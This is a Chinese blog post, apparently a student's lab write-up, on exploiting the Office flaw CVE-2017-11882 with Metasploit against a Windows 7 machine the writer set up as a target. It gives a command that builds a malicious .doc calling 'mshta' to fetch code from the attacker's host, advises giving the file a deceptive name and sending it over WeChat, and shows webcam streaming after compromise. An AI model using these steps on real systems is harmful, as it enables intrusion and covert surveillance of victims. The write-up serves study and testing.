# MSF 渗透测试-CVE-2017-11882（MSOffice 漏洞） - Magic_Tsang - 博客园

> 原文：[`www.cnblogs.com/zl20154312/p/8877386.html`](https://www.cnblogs.com/zl20154312/p/8877386.html)

1.测试环境

2.测试前准备

3.测试过程

—3.1 虚拟机环境测试

—3.2 局域网靶机测试

4.测试感想

### 1.测试环境

**攻击机：**

OS：kail

IP：192.168.15.132/192.168.137.231

**靶机：**

OS：Windows7

Office 版本：Office2013_CN

IP:

### 2.测试前准备

1.[下载`python`脚本](https://github.com/Ridter/CVE-2017-11882)

![](img/363394799cd84d7f3a0618291ff9d077.png)

2.[下载`MSF`组件](https://github.com/0x09AL/CVE-2017-11882-metasploit)

![](img/1f9d9e496e4be7e74ffd6d43acc9519f.png)

3.将`cve_2017_11882.rb`复制到`/usr/share/metasploit-framework/modules/exploits/windows/smb/`目录下

![](img/b814f635ad353ffbdf15ea8472bc74cf.png)

4.把下载的`cve_2017_11882.rtf`复制到`/usr/share/metasploit-framework/data/exploits/`目录下

![](img/b606e69a6781fd2689e35a4123783296.png)

5.把`Command109b_CVE-2017-11882.py`复制到`/root`目录下

### 3.测试过程

#### 3.1 虚拟机环境测试

1.`msfconsole`执行`search`命令

![](img/310f525c9d656d3ded40c3e4c8653bfc.png)

2.设置`payload`为`reverse_tcp`，设置`LHOST`为`192.168.15.132`，设置`URIPATH`为`test`（之后利用`python`脚本生成 doc 文件的时候也要使用相同路径）

![](img/20d1dc244828b4c47ea46456776f8eef.png)

3.`show options`显示设置

![](img/ff08eaff9a8ab555fd94053bfd534153.png)

4.`exploit -j`运行

![](img/ffd1c481c7d4bd034452f33222dc8411.png)

5.另开一个`terminal`，`python Command109b_CVE-2017-11882.py -c "mshta http://192.168.15.132:8080/test" -o kail_help.doc`

![](img/39402ff6a8c0feb156cd6fa236cfc878.png)

6.把生成的`kail_help`复制到靶机中打开，是个空白文档

![](img/96ebeff55c9248694a320d00fad52dfe.png)

7.回连成功![](img/15cf3feddb982d0660aac415c1f49363.png)

8.`sessions -i 1`接管活动会话 1，`shell`可以看到已经成功渗透靶机

![](img/cb8de7961af00e193f516f8ec23a954e.png)

#### 3.2 局域网靶机测试

0.更改 kail 网络链接模式由`NAT->桥接`，获得一个与靶机在同一网段下的 IP`192.168.137.231`

1.更改一下`LHOST`，重新生成一个 doc 文件，`exploit -j`监听

![](img/4ab110823043f764804947d85ee9b8ae.png)

2.将文件改名为`kail_help2.doc`通过微信发给靶机（随便改啥，具有迷惑性就行）

3.靶机打开 doc，Windows7 防火墙处于打开状态，无杀软

![](img/9c0e223b6f6c43042eeb3ff04711fd3a.png)

4.攻击机获得回连，`sessions -i 1`接管

![](img/3058537f84f608df7d112af49d816e27.png)

5.`webcam_stream`可以直接控制摄像头进行直播

![](img/992713abd0560458e17caa9ec0b89b6a.png)

6.`shell`中获取靶机桌面信息

![](img/78c7a8eacf90175e6f2ccc91513cf950.png)

### 4.测试感想

*   前人栽树，后人乘凉。`github`和`meterpreter-db`上有漏洞相关的`msf 模块`和`python 脚本`可以直接使用
*   老旧系统、软件十分不靠谱，易于攻入。其实还实践了`WindowsDefender+Windows10`的组合，`WinodowsDefender`会直接将 doc 文件杀掉，但是这个版本的 WIN7 还是应用很广的，包括 Office2013 可以说是学生中应用十分广泛的版本（这个 Windwos 镜像和 office2013 都是徐日老师 FTP 服务器上的版本，在 DKY 安装率应该还是很有保证的）